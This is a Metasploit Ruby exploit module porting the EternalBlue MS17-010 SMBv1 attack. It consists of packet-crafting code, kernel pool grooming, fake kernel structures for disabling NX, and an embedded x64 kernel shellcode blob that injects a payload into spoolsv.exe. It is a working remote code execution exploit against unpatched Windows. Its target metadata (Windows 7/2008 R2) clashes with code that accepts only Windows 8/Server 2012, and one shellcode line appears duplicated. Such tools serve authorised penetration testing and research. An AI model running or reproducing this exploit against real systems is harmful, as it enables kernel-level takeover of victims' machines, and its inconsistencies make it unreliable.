##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb'
require 'ruby_smb/smb1/packet'
require 'rubyntlm'
require 'net/ntlm'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  MAX_SHELLCODE_SIZE = 3712

  # debug mode affects HAL heap. The 0xffffffffffd04000 address should be useable no matter what debug mode is.
  # The 0xffffffffffd00000 address should be useable when debug mode is not enabled
  # The 0xffffffffffd01000 address should be useable when debug mode is enabled
  TARGET_HAL_HEAP_ADDR = 0xffffffffffd04000 # for put fake struct and shellcode

  # because the srvnet buffer is changed dramatically from Windows 7, I have to choose NTFEA size to 0x9000
  NTFEA_SIZE = 0x9000

  NTFEA_9000 = (([0, 0, 0].pack('CCS<') + "\x00") * 0x260 + # with these fea, ntfea size is 0x1c80
                [0, 0, 0x735c].pack('CCS<') + "\x00" * 0x735d + # 0x8fe8 - 0x1c80 - 0xc = 0x735c
                [0, 0, 0x8147].pack('CCS<') + "\x00" * 0x8148) # overflow to SRVNET_BUFFER_HDR

  NTLM_CRYPT = Rex::Proto::NTLM::Crypt

  include Msf::Exploit::Remote::Tcp

  # fake struct for SrvNetWskTransformedReceiveComplete() and SrvNetCommonReceiveHandler()
  # x64: fake struct is at ffffffff ffd00e00
  #   offset 0x50:  KSPIN_LOCK
  #   offset 0x58:  LIST_ENTRY must be valid address. cannot be NULL.
  #   offset 0x110: array of pointer to function
  #   offset 0x13c: set to 3 (DWORD) for invoking ptr to function
  # some useful offset
  #   offset 0x120: arg1 when invoking ptr to function
  #   offset 0x128: arg2 when invoking ptr to function
  #
  # code path to get code exection after this struct is controlled
  # SrvNetWskTransformedReceiveComplete() -> SrvNetCommonReceiveHandler() -> call fn_ptr
  FAKE_RECV_STRUCT = (
    ("\x00" * 16) * 5
    + [0, TARGET_HAL_HEAP_ADDR + 0x58].pack('QQ<')  # offset 0x50: KSPIN_LOCK, (LIST_ENTRY to itself)
    + [TARGET_HAL_HEAP_ADDR + 0x58, 0].pack('QQ<')  # offset 0x60
    + ("\x00" * 16) * 10
    + [TARGET_HAL_HEAP_ADDR + 0x170, 0].pack('QQ<') # offset 0x110: fn_ptr array
    + [(0x8150 ^ 0xffffffffffffffff) + 1, 0].pack('QQ<') # set arg1 to -0x8150
    + [0, 0, 3].pack('QII<') # offset 0x130
    + ("\x00" * 16) * 3
    + [0, TARGET_HAL_HEAP_ADDR + 0x180].pack('QQ<') # shellcode address
  )

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption',
        'Description' => %q{
          This module is a port of the Equation Group ETERNALBLUE exploit, part of
          the FuzzBunch toolkit released by Shadow Brokers.

          There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size
          is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a
          DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow
          is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later
          completed in srvnet!SrvNetWskReceiveComplete.

          This exploit, like the original may not trigger 100% of the time, and should be
          run continuously until triggered. It seems like the pool will get hot streaks
          and need a cool down period before the shells rain in again.

          The module will attempt to use Anonymous login, by default, to authenticate to perform the
          exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use
          those instead.

          On some systems, this module may cause system instability and crashes, such as a BSOD or
          a reboot. This may be more likely with some payloads.
        },

        'Author' =>
          [
            'Sean Dillon <sean.dillon@risksense.com>', # @zerosum0x0
            'Dylan Davis <dylan.davis@risksense.com>', # @jennamagius
            'Equation Group',
            'Shadow Brokers',
            'thelightcosine' # RubySMB refactor and Fallback Credential mode
          ],
        'License' => MSF_LICENSE,
        'References' =>
          [
            ['MSB', 'MS17-010'],
            ['CVE', '2017-0143'],
            ['CVE', '2017-0144'],
            ['CVE', '2017-0145'],
            ['CVE', '2017-0146'],
            ['CVE', '2017-0147'],
            ['CVE', '2017-0148'],
            ['URL', 'https://github.com/RiskSense-Ops/MS17-010']
          ],
        'DefaultOptions' =>
          {
            'EXITFUNC' => 'thread',
            'CheckModule' => 'auxiliary/scanner/smb/smb_ms17_010',
            'WfsDelay' => 5
          },
        'Privileged' => true,
        'Payload' =>
          {
            'Space' => 2000, # this can be more, needs to be recalculated
            'EncoderType' => Msf::Encoder::Type::Raw
          },
        'Platform' => 'win',
        'Targets' =>
          [
            [
              'Windows 7 and Server 2008 R2 (x64) All Service Packs',
              {
                'Platform' => 'win',
                'Arch' => [ARCH_X64],
                'os_patterns' => ['Server 2008 R2', 'Windows 7', 'Windows Embedded Standard 7'],
                'ep_thl_b' => 0x308, # EPROCESS.ThreadListHead.Blink offset
                'et_alertable' => 0x4c, # ETHREAD.Alertable offset
                'teb_acp' => 0x2c8, # TEB.ActivationContextPointer offset
                'et_tle' => 0x420 # ETHREAD.ThreadListEntry offset
              }
            ]
          ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2017-03-14',
        'Notes' =>
          {
            'AKA' => ['ETERNALBLUE']
          }
      )
    )

    register_options(
      [
        Opt::RPORT(445),
        OptBool.new('VERIFY_TARGET', [true, 'Check if remote OS matches exploit Target.', true]),
        OptBool.new('VERIFY_ARCH', [true, 'Check if remote architecture matches exploit Target.', true]),
        OptString.new('SMBUser', [false, '(Optional) The username to authenticate as', '']),
        OptString.new('SMBPass', [false, '(Optional) The password for the specified username', '']),
        OptString.new('SMBDomain', [false, '(Optional) The Windows domain to use for authentication', '.'])
      ]
    )
    register_advanced_options(
      [
        OptBool.new('ForceExploit', [false, 'Override check result', false]),
        OptString.new('ProcessName', [true, 'Process to inject payload into.', 'spoolsv.exe']),
        OptInt.new('MaxExploitAttempts', [true, 'The number of times to retry the exploit.', 3]),
        OptInt.new('GroomAllocations', [true, 'Initial number of times to groom the kernel pool.', 13]),
      ]
    )
  end

  def smb1_connect_ipc(client_only: false, negotiate_only: false, force_anon: false, tree_login: true, extended_security: false, pid: -1)
    begin
      sock = connect(false)

      dispatcher = RubySMB::Dispatcher::Socket.new(sock)
      client = RubySMB::Client.new(dispatcher, smb1: true, smb2: false, smb3: false, username: smb_user, domain: smb_domain, password: smb_pass)

      if client_only
        return client, nil, sock
      end

      request_packet = client.negotiate_request

      request_packet.smb_header.flags2.extended_security = extended_security ? 1 : 0
      request_packet.smb_header.flags2.paging_io = 0
      request_packet.smb_header.flags2.unicode = 0

      request_packet.smb_header.pid_low = pid if pid > -1

      if negotiate_only
        client.negotiate(req_packet: request_packet)
        return client, nil, sock
      else
        response_code = client.login(force_anon: force_anon, req_packet: request_packet, pid: pid)

        unless response_code == ::WindowsError::NTStatus::STATUS_SUCCESS
          raise RubySMB::Error::UnexpectedStatusCode, "Error with login: #{response_code}"
        end

        if tree_login
          tree = client.tree_connect("\\\\#{datastore['RHOST']}\\IPC$", pid)
        end
      end

      return client, tree, sock
    rescue StandardError => e
      print_error("Could not make SMBv1 connection. #{e.class} error raised with message '#{e.message}'")
      elog('Could not make SMBv1 connection', error: e)

      # for an as of yet undetermined reason, a connection can sometimes be created after an error during an anonymous
      # login.
      if client
        client.disconnect!
      end

      raise e
    end
  end

  def send_trans2_second(conn, tid, pid, data, displacement)
    pkt = RubySMB::SMB1::Packet::Trans2::RequestSecondary.new
    pkt.smb_header.tid = tid
    pkt.smb_header.pid_low = pid

    pkt.parameter_block.total_parameter_count = 0
    pkt.parameter_block.total_data_count = data.length

    fixedOffset = 32 + 3 + 18
    pkt.data_block.pad1 = ''

    pkt.parameter_block.parameter_count = 0
    pkt.parameter_block.parameter_offset = 0

    if data.length > 0
      pad2Len = (4 - fixedOffset % 4) % 4

      if pad2Len == 0
        pkt.data_block.pad1 = ''
      elsif pad2Len == 3
        pkt.data_block.pad1 = "\x00" * 2
        pkt.data_block.pad1 = "\x00"
      else
        pkt.data_block.pad1 = "\x00" * pad2Len
      end
    else
      pkt.data_block.pad1 = ''
      pad2Len = 0
    end

    pkt.parameter_block.data_count = data.length
    pkt.parameter_block.data_offset = fixedOffset + pad2Len
    pkt.parameter_block.data_displacement = displacement

    pkt.data_block.trans2_parameters = ''
    pkt.data_block.trans2_data = data

    pkt.smb_header.flags2.extended_security = 1
    pkt.smb_header.flags2.paging_io = 0
    pkt.smb_header.flags2.unicode = 0

    pkt.smb_header.uid = BinData::Bit16le.read(BinData::Bit16.new(2048).to_binary_s)

    conn.send_packet(pkt)
  end

  # connect to target and send a large nbss size with data 0x80 bytes
  # this method is for allocating big nonpaged pool on target
  def create_connection_with_big_SMB_first80(for_nx = false)
    sock = connect(false)
    pkt = "\x00" + "\x00" + [0x8100].pack('S>')
    # There is no need to be SMB2 because we want the target free the corrupted buffer.
    # Also this is invalid SMB2 message.
    # I believe NSA exploit use SMB2 for hiding alert from IDS
    # pkt += '\xfeSMB' # smb2
    # it can be anything even it is invalid
    pkt += "\x01\x02\x03\x04"

    if for_nx
      # MUST set no delay because 1 byte MUST be sent immediately
      sock.setsockopt(Socket::IPPROTO_TCP, Socket::TCP_NODELAY, 1)
      pkt += "\x00" * 0x7b # another byte will be sent later to disabling NX
    else
      pkt += "\x00" * 0x7c
    end

    sock.send(pkt, 0)
    sock
  end

  def send_big_trans2(conn, tid, pid, setup, data, param, firstDataFragmentSize, sendLastChunk = true)
    pkt = RubySMB::SMB1::Packet::NtTrans::Request.new
    pkt.smb_header.tid = tid

    pkt.smb_header.pid_low = pid

    command = [setup].pack('S<')

    pkt.parameter_block.max_setup_count = 1
    pkt.parameter_block.max_parameter_count = param.length
    pkt.parameter_block.max_data_count = 0

    pkt.parameter_block.setup << 0x0000
    pkt.parameter_block.total_parameter_count = param.length
    pkt.parameter_block.total_data_count = data.length

    fixedOffset = 32 + 3 + 38 + command.length
    if param.length > 0
      padLen = (4 - fixedOffset % 4) % 4
      padBytes = "\x00" * padLen
      pkt.data_block.pad1 = padBytes
    else
      pkt.data_block.pad1 = ''
      padLen = 0
    end

    pkt.parameter_block.parameter_count = param.length
    pkt.parameter_block.parameter_offset = fixedOffset + padLen

    if data.length > 0
      pad2Len = (4 - (fixedOffset + padLen + param.length) % 4) % 4
      pkt.data_block.pad2 = "\x00" * pad2Len
    else
      pkt.data_block.pad2 = ''
      pad2Len = 0
    end

    pkt.parameter_block.data_count = firstDataFragmentSize
    pkt.parameter_block.data_offset = pkt.parameter_block.parameter_offset + param.length + pad2Len

    pkt.data_block.trans2_parameters = param
    pkt.data_block.trans2_data = data.first(firstDataFragmentSize)

    pkt.smb_header.flags2.paging_io = 0
    pkt.smb_header.flags2.extended_security = 1

    recvPkt = RubySMB::SMB1::Packet::NtTrans::Response.read(conn.send_recv(pkt))

    if recvPkt.status_code.value == 0
      print_good('got good NT Trans response')
    else
      print_error("got bad NT Trans response: #{recvPkt.status_code.name}\n#{recvPkt.status_code.description}")
      return nil
    end

    # Then, use SMB_COM_TRANSACTION2_SECONDARY for send more data
    i = firstDataFragmentSize
    while i < data.length
      sendSize = [4096, data.length - i].min
      if data.length - i <= 4096 && !sendLastChunk
        break
      end

      send_trans2_second(conn, tid, pid, data[i...i + sendSize], i)
      i += sendSize
    end

    if sendLastChunk
      conn.recv_packet
    end

    i
  end

  def _exploit(fea_list, shellcode, num_groom_conn, username, password)
    conn, tree, sock = smb1_connect_ipc(extended_security: true)
    pid = conn.pid

    os = conn.peer_native_os
    puts 'Target OS: ' + os

    if os.start_with?('Windows 10')
      build = os.split.last.to_i
      if build >= 14393 # version 1607
        puts('This exploit does not support this build')
        return
      end
    elsif !(os.start_with?('Windows 8') || os.start_with?('Windows Server 2012 '))
      print('This exploit does not support this target:')
      return
    end

    # # The minimum requirement to trigger bug in SrvOs2FeaListSizeToNt() is SrvSmbOpen2() which is TRANS2_OPEN2 subcommand.
    # # Send TRANS2_OPEN2 (0) with special fea_list to a target exce
    progress = send_big_trans2(conn, tree.id, pid, 0, fea_list, "\x00" * 30, fea_list.length % 4096, false)

    if progress.nil?
      conn.disconnect!
      return
    end

    fea_list_nx = generate_feal_list_nx

    nx_conn, nx_tree, nx_sock = smb1_connect_ipc(extended_security: true, pid: pid)
    # Another TRANS2_OPEN2 (0) with special fea_list for disabling NX
    nx_progress = send_big_trans2(nx_conn, nx_tree.id, pid, 0, fea_list_nx, "\x00" * 30, fea_list.length % 4096, false)

    if nx_progress.nil?
      conn.disconnect!
      nx_conn.disconnect!
      return
    end

    # create some big buffer at servereternal
    # this buffer MUST NOT be big enough for overflown buffer
    alloc_conn, alloc_sock = create_session_alloc_non_paged(NTFEA_SIZE - 0x2010, username, password, pid)
    if alloc_conn.nil?
      return
    end

    # groom nonpaged pool
    # when many big nonpaged pool are allocated, allocate another big nonpaged pool should be next to the last one
    srvnetConn = []
    num_groom_conn.times { srvnetConn.append(create_connection_with_big_SMB_first80(true)) }

    # create buffer size NTFEA_SIZE at server
    # this buffer will be replaced by overflown buffer
    hole_conn, hole_sock = create_session_alloc_non_paged(NTFEA_SIZE - 0x10, username, password, pid)
    if hole_conn.nil?
      return
    end

    # disconnect allocConn to free buffer
    # expect small nonpaged pool allocation is not allocated next to holeConn because of this free buffer
    alloc_sock.close

    # hope one of srvnetConn is next to holeConn
    5.times { srvnetConn.append(create_connection_with_big_SMB_first80(true)) }

    # remove holeConn to create hole for fea buffer
    hole_sock.close

    # send last fragment to create buffer in hole and OOB write one of srvnetConn struct header
    # first trigger, overwrite srvnet buffer struct for disabling NX
    send_trans2_second(nx_conn, nx_tree.id, pid, fea_list_nx[nx_progress, fea_list_nx.length], nx_progress)

    recvPkt = RubySMB::SMB1::Packet::Trans2::Response.read(nx_conn.recv_packet)
    if recvPkt.status_code.value == 0xc000000d
      print_good('good response status for nx: INVALID_PARAMETER')
    else
      print_error("bad response status for nx: #{recvPkt.status_code.value}")
    end

    # one of srvnetConn struct header should be modified
    # send '\x00' to disable nx
    srvnetConn.each do |sk|
      sk.send("\x00", 0)
    end

    puts('PING2')

    # send last fragment to create buffer in hole and OOB write one of srvnetConn struct header
    # second trigger, place fake struct and shellcode
    send_trans2_second(conn, tree.id, pid, fea_list[progress, fea_list.length], progress)
    recvPkt = RubySMB::SMB1::Packet::Trans2::Response.read(conn.recv_packet)
    if recvPkt.status_code.value == 0xc000000d
      print_good('good response status for nx: INVALID_PARAMETER')
    else
      print_error("bad response status for nx: #{recvPkt.status_code.value}")
    end

    puts('PING3')

    # one of srvnetConn struct header should be modified
    # a corrupted buffer will write recv data in designed memory address
    for sk in srvnetConn
      sk.send(FAKE_RECV_STRUCT + shellcode, 0)
    end

    puts('PING4')

    # execute shellcode
    for sk in srvnetConn
      sk.close
    end

    nx_tree.disconnect!
    nx_conn.disconnect!
    nx_sock.close

    tree.disconnect!
    conn.disconnect!
    sock.close

    puts('PING6')
  end

  def hash(process)
    # calc_hash from eternalblue_kshellcode_x64.asm
    proc_hash = 0
    (process + "\x00").split('').each do |c|
      proc_hash = ror(proc_hash, 13)
      proc_hash += c.ord
    end
    return [proc_hash].pack('I<')
  end

  def ror(dword, bits)
    return (dword >> bits | dword << (32 - bits)) & 0xFFFFFFFF
  end

  def eternalblue_kshellcode_x64(process = 'spoolsv.exe')
    proc_hash = hash(process)

    "\x55\xe8\x2e\x00\x00\x00\xb9\x82\x00\x00\xc0\x0f\x32\x4c\x8d" +
      "\x0d\x34\x00\x00\x00\x44\x39\xc8\x74\x19\x39\x45\x00\x74\x0a" +
      "\x89\x55\x04\x89\x45\x00\xc6\x45\xf8\x00\x49\x91\x50\x5a\x48" +
      "\xc1\xea\x20\x0f\x30\x5d\xc3\x48\x8d\x2d\x00\x10\x00\x00\x48" +
      "\xc1\xed\x0c\x48\xc1\xe5\x0c\x48\x83\xed\x70\xc3\x0f\x01\xf8" +
      "\x65\x48\x89\x24\x25\x10\x00\x00\x00\x65\x48\x8b\x24\x25\xa8" +
      "\x01\x00\x00\x6a\x2b\x65\xff\x34\x25\x10\x00\x00\x00\x50\x50" +
      "\x55\xe8\xc5\xff\xff\xff\x48\x8b\x45\x00\x48\x83\xc0\x1f\x48" +
      "\x89\x44\x24\x10\x51\x52\x41\x50\x41\x51\x41\x52\x41\x53\x31" +
      "\xc0\xb2\x01\xf0\x0f\xb0\x55\xf8\x75\x14\xb9\x82\x00\x00\xc0" +
      "\x8b\x45\x00\x8b\x55\x04\x0f\x30\xfb\xe8\x0e\x00\x00\x00\xfa" +
      "\x41\x5b\x41\x5a\x41\x59\x41\x58\x5a\x59\x5d\x58\xc3\x41\x57" +
      "\x41\x56\x57\x56\x53\x50\x4c\x8b\x7d\x00\x49\xc1\xef\x0c\x49" +
      "\xc1\xe7\x0c\x49\x81\xef\x00\x10\x00\x00\x66\x41\x81\x3f\x4d" +
      "\x5a\x75\xf1\x4c\x89\x7d\x08\x65\x4c\x8b\x34\x25\x88\x01\x00" +
      "\x00\xbf\x78\x7c\xf4\xdb\xe8\x01\x01\x00\x00\x48\x91\xbf\x3f" +
      "\x5f\x64\x77\xe8\xfc\x00\x00\x00\x8b\x40\x03\x89\xc3\x3d\x00" +
      "\x04\x00\x00\x72\x03\x83\xc0\x10\x48\x8d\x50\x28\x4c\x8d\x04" +
      "\x11\x4d\x89\xc1\x4d\x8b\x09\x4d\x39\xc8\x0f\x84\xc6\x00\x00" +
      "\x00\x4c\x89\xc8\x4c\x29\xf0\x48\x3d\x00\x07\x00\x00\x77\xe6" +
      "\x4d\x29\xce\xbf\xe1\x14\x01\x17\xe8\xbb\x00\x00\x00\x8b\x78" +
      "\x03\x83\xc7\x08\x48\x8d\x34\x19\xe8\xf4\x00\x00\x00\x3d" + proc_hash +
      "\x74\x10\x3d" + proc_hash + "\x74\x09\x48\x8b\x0c" +
      "\x39\x48\x29\xf9\xeb\xe0\xbf\x48\xb8\x18\xb8\xe8\x84\x00\x00" +
      "\x00\x48\x89\x45\xf0\x48\x8d\x34\x11\x48\x89\xf3\x48\x8b\x5b" +
      "\x08\x48\x39\xde\x74\xf7\x4a\x8d\x14\x33\xbf\x3e\x4c\xf8\xce" +
      "\xe8\x69\x00\x00\x00\x8b\x40\x03\x48\x83\x7c\x02\xf8\x00\x74" +
      "\xde\x48\x8d\x4d\x10\x4d\x31\xc0\x4c\x8d\x0d\xa9\x00\x00\x00" +
      "\x55\x6a\x01\x55\x41\x50\x48\x83\xec\x20\xbf\xc4\x5c\x19\x6d" +
      "\xe8\x35\x00\x00\x00\x48\x8d\x4d\x10\x4d\x31\xc9\xbf\x34\x46" +
      "\xcc\xaf\xe8\x24\x00\x00\x00\x48\x83\xc4\x40\x85\xc0\x74\xa3" +
      "\x48\x8b\x45\x20\x80\x78\x1a\x01\x74\x09\x48\x89\x00\x48\x89" +
      "\x40\x08\xeb\x90\x58\x5b\x5e\x5f\x41\x5e\x41\x5f\xc3\xe8\x02" +
      "\x40\x08\xeb\x90\x58\x5b\x5e\x5f\x41\x5e\x41\x5f\xc3\xe8\x02" +
      "\x00\x00\x00\xff\xe0\x53\x51\x56\x41\x8b\x47\x3c\x41\x8b\x84" +
      "\x07\x88\x00\x00\x00\x4c\x01\xf8\x50\x8b\x48\x18\x8b\x58\x20" +
      "\x4c\x01\xfb\xff\xc9\x8b\x34\x8b\x4c\x01\xfe\xe8\x1f\x00\x00" +
      "\x00\x39\xf8\x75\xef\x58\x8b\x58\x24\x4c\x01\xfb\x66\x8b\x0c" +
      "\x4b\x8b\x58\x1c\x4c\x01\xfb\x8b\x04\x8b\x4c\x01\xf8\x5e\x59" +
      "\x5b\xc3\x52\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x85\xc0\x75" +
      "\xf6\x92\x5a\xc3\x55\x53\x57\x56\x41\x57\x49\x8b\x28\x4c\x8b" +
      "\x7d\x08\x52\x5e\x4c\x89\xcb\x31\xc0\x44\x0f\x22\xc0\x48\x89" +
      "\x02\x89\xc1\x48\xf7\xd1\x49\x89\xc0\xb0\x40\x50\xc1\xe0\x06" +
      "\x50\x49\x89\x01\x48\x83\xec\x20\xbf\xea\x99\x6e\x57\xe8\x65" +
      "\xff\xff\xff\x48\x83\xc4\x30\x85\xc0\x75\x45\x48\x8b\x3e\x48" +
      "\x8d\x35\x4d\x00\x00\x00\xb9\x00\x06\x00\x00\xf3\xa4\x48\x8b" +
      "\x45\xf0\x48\x8b\x40\x18\x48\x8b\x40\x20\x48\x8b\x00\x66\x83" +
      "\x78\x48\x18\x75\xf6\x48\x8b\x50\x50\x81\x7a\x0c\x33\x00\x32" +
      "\x00\x75\xe9\x4c\x8b\x78\x20\xbf\x5e\x51\x5e\x83\xe8\x22\xff" +
      "\xff\xff\x48\x89\x03\x31\xc9\x88\x4d\xf8\xb1\x01\x44\x0f\x22" +
      "\xc1\x41\x5f\x5e\x5f\x5b\x5d\xc3\x48\x92\x31\xc9\x51\x51\x49" +
      "\x89\xc9\x4c\x8d\x05\x0d\x00\x00\x00\x89\xca\x48\x83\xec\x20" +
      "\xff\xd0\x48\x83\xc4\x30\xc3"
  end

  def create_feal_list(sc_size)
    feal_list = [0x10000].pack('I<')
    feal_list += NTFEA_9000
    fakeSrvNetBuf = createFakeSrvNetBuffer(sc_size)
    feal_list += [0, 0, fakeSrvNetBuf.length - 1].pack('CCS<') + fakeSrvNetBuf # -1 because first '\x00' is for name
    # stop copying by invalid flag (can be any value except 0 and 0x80)
    feal_list += [0x12, 0x34, 0x5678].pack('CCS<')
    return feal_list
  end

  def createFakeSrvNetBuffer(sc_size)
    # 0x180 is size of fakeSrvNetBufferX64
    totalRecvSize = 0x80 + 0x180 + sc_size
    fakeSrvNetBufferX64 = "\x00" * 16
    fakeSrvNetBufferX64 += [0xfff0, 0, 0, TARGET_HAL_HEAP_ADDR].pack('SSIQ<') # flag, _, _, pNetRawBuffer
    fakeSrvNetBufferX64 += [0, 0x82e8, 0].pack('QII<') # _, thisNonPagedPoolSize, _
    fakeSrvNetBufferX64 += "\x00" * 16
    fakeSrvNetBufferX64 += [0, totalRecvSize].pack('QQ<') # offset 0x40
    fakeSrvNetBufferX64 += [TARGET_HAL_HEAP_ADDR, TARGET_HAL_HEAP_ADDR].pack('<QQ') # pmdl2, pointer to fake struct
    fakeSrvNetBufferX64 += [0, 0].pack('QQ<')
    fakeSrvNetBufferX64 += "\x00" * 16
    fakeSrvNetBufferX64 += "\x00" * 16
    fakeSrvNetBufferX64 += [0, 0x60, 0x1004, 0].pack('QSSI<') # MDL.Next, MDL.Size, MDL.MdlFlags
    fakeSrvNetBufferX64 += [0, TARGET_HAL_HEAP_ADDR - 0x80].pack('QQ<') # MDL.Process, MDL.MappedSystemVa

    return fakeSrvNetBufferX64
  end

  def exploit
    rport = datastore['RPORT'].to_i
    num_groom_conn = datastore['GroomAllocations'].to_i
    smbuser = datastore.keys.include?('SMBUser') ? datastore['SMBUser'] : ''
    smbpass = datastore.keys.include?('SMBPass') ? datastore['SMBPass'] : ''

    sc = eternalblue_kshellcode_x64(datastore['ProcessName']) + payload.encoded

    if sc.length > MAX_SHELLCODE_SIZE
      print_error("Shellcode too long. The place that this exploit put a shellcode is limited to #{MAX_SHELLCODE_SIZE} bytes.")
      return
    end

    fea_list = create_feal_list(sc.length)

    print_good("shellcode size: #{sc.length}")
    print_good("numGroomConn: #{num_groom_conn}")

    begin
      _exploit(fea_list, sc, num_groom_conn, smbuser, smbpass)
    rescue StandardError => e
      print_error("Exploit failed with the following error: #{e.message}")
      elog('Error encountered with eternalblue_win8', error: e)
      return false
    end
  end

  def create_session_alloc_non_paged(size, username, password, pid)
    # if not use unicode, buffer size on target machine is doubled because converting ascii to utf16
    pkt = SessionSetupSMB1RequestWithPoorlyFormedDataBlock.new

    anon_conn, anon_tree, anon_sock = smb1_connect_ipc(negotiate_only: true, pid: pid)

    pkt.smb_header.pid_low = pid

    if size >= 65535 # 0xffff
      pkt.data_block.security_blob = [(size / 2).floor].pack('S<') + "\x00" * 20
      pkt.smb_header.flags2.unicode = 0
    else
      pkt.data_block.security_blob = [size].pack('S<') + "\x00" * 20
      pkt.smb_header.flags2.unicode = 1
    end

    pkt.smb_header.flags2.extended_security = 0
    pkt.smb_header.flags2.nt_status = 1
    pkt.smb_header.flags2.paging_io = 0

    pkt.parameter_block.max_buffer_size = 61440 # can be any value greater than response size
    pkt.parameter_block.max_mpx_count = 2 # can by any value
    pkt.parameter_block.vc_number = 2 # any non-zero
    pkt.parameter_block.session_key = 0
    pkt.parameter_block.security_blob_length = 0 # this is OEMPasswordLen field in another format. 0 for NULL session

    pkt.parameter_block.capabilities.each_pair do |k, _v|
      if k == :nt_status || k == :extended_security
        pkt.parameter_block.capabilities[k] = 1
      else
        pkt.parameter_block.capabilities[k] = 0
      end
    end

    recvPkt = RubySMB::SMB1::Packet::SessionSetupResponse.read(anon_conn.send_recv(pkt))

    if recvPkt.status_code.value == 0
      print_good('SMB1 session setup allocate nonpaged pool success')
      return anon_conn, anon_sock
    end

    anon_conn.disconnect!

    unless username.empty?
      # Try login with valid user because anonymous user might get access denied on Windows Server 2012.
      # Note: If target allows only NTLMv2 authentication, the login will always fail.
      # support only ascii because I am lazy to implement Unicode (need pad for alignment and converting username to utf-16)
      reqSize = (size / 2).floor
      pkt.smb_header.flags2.unicode = 0

      auth_conn, auth_tree, auth_sock = smb1_connect_ipc(negotiate_only: true, pid: pid)

      pkt.smb_header.pid_low = pid

      # challenge_packet = conn.smb1_ntlmssp_challenge_packet(conn.smb1_ntlmssp_negotiate)
      # type2_b64_message = conn.smb1_type2_message(challenge_packet)

      #server_challenge = response_packet.data_block.server_guid[0, 8]
      server_challenge = auth_conn.server_guid[0, 8]

      pwd_unicode = NTLM_CRYPT.ntlm_md4(password, server_challenge)

      pkt.parameter_block.reserved = pwd_unicode.length
      pkt.data_block.security_blob = [reqSize + pwd_unicode.length + username.length].pack('S<') + pwd_unicode + username + "\x00" * 16

      recvPkt = RubySMB::SMB1::Packet::SessionSetupResponse.read(auth_conn.send_recv(pkt))

      if recvPkt.status_code.value == 0
        print_good('SMB1 session setup allocate nonpaged pool success')
        return auth_conn, auth_sock
      end
      auth_conn.disconnect!
    end

    print_error("SMB1 session setup allocate nonpaged pool failed: #{recvPkt.status_code.name}\n#{recvPkt.status_code.description}")
    return nil
  end

  def generate_feal_list_nx
    # feal_list for disabling NX is possible because we just want to change only MDL.MappedSystemVa
    # PTE of 0xffffffffffd00000 is at 0xfffff6ffffffe800
    # NX bit is at PTE_ADDR+7
    # MappedSystemVa = PTE_ADDR+7 - 0x7f
    shellcode_page_addr = (TARGET_HAL_HEAP_ADDR + 0x400) & 0xfffffffffffff000
    pte_addr = 0xfffff6ffffffe800 + 8 * ((shellcode_page_addr - 0xffffffffffd00000) >> 12)
    fake_srv_net_buffer_X64Nx = "\x00" * 16
    fake_srv_net_buffer_X64Nx += [0xfff0, 0, 0, TARGET_HAL_HEAP_ADDR].pack('SSIQ<')
    fake_srv_net_buffer_X64Nx += "\x00" * 16
    fake_srv_net_buffer_X64Nx += "\x00" * 16
    fake_srv_net_buffer_X64Nx += [0, 0].pack('QQ<')
    fake_srv_net_buffer_X64Nx += [0, TARGET_HAL_HEAP_ADDR].pack('QQ<') # _, _, pointer to fake struct
    fake_srv_net_buffer_X64Nx += [0, 0,].pack('QQ<')
    fake_srv_net_buffer_X64Nx += "\x00" * 16
    fake_srv_net_buffer_X64Nx += "\x00" * 16
    fake_srv_net_buffer_X64Nx += [0, 0x60, 0x1004, 0].pack('QSSI<') # MDL.Next, MDL.Size, MDL.MdlFlags
    fake_srv_net_buffer_X64Nx += [0, pte_addr + 7 - 0x7f].pack('QQ<') # MDL.Process, MDL.MappedSystemVa

    fea_list_nx = [0x10000].pack('I<')
    fea_list_nx += NTFEA_9000
    fea_list_nx += [0, 0, fake_srv_net_buffer_X64Nx.length - 1].pack('CCS<') + fake_srv_net_buffer_X64Nx # -1 because first '\x00' is for name
    # stop copying by invalid flag (can be any value except 0 and 0x80)
    fea_list_nx += [0x12, 0x34, 0x5678].pack('CCS<')

    fea_list_nx
  end

  # Returns the value to be passed to SMB clients for
  # the password. If the user has not supplied a password
  # it returns an empty string to trigger an anonymous
  # logon.
  #
  # @return [String] the password value
  def smb_pass
    if datastore['SMBPass'].present?
      datastore['SMBPass']
    else
      ''
    end
  end

  # Returns the value to be passed to SMB clients for
  # the username. If the user has not supplied a username
  # it returns an empty string to trigger an anonymous
  # logon.
  #
  # @return [String] the username value
  def smb_user
    if datastore['SMBUser'].present?
      datastore['SMBUser']
    else
      ''
    end
  end

  # Returns the value to be passed to SMB clients for
  # the domain. If the user has not supplied a domain
  # it returns an empty string to trigger an anonymous
  # logon.
  #
  # @return [String] the domain value
  def smb_domain
    if datastore['SMBDomain'].present?
      datastore['SMBDomain']
    else
      ''
    end
  end

  class SessionSetupSMB1RequestWithPoorlyFormedDataBlock < RubySMB::GenericPacket
    COMMAND = RubySMB::SMB1::Commands::SMB_COM_SESSION_SETUP_ANDX

    class ParameterBlock < RubySMB::SMB1::Packet::SessionSetupRequest::ParameterBlock
    end

    class DataBlock < RubySMB::SMB1::DataBlock
      # Key difference for this class is that the length of security_blob is NOT dictated by the value of
      # security_blob_length in the +SessionSetupRequest::ParameterBlock+
      string :security_blob, label: 'Security Blob (GSS-API)'
      string :native_os, label: 'Native OS'
      string :native_lan_man, label: 'Native LAN Manager'
    end

    smb_header :smb_header
    parameter_block :parameter_block
    data_block :data_block
  end
end
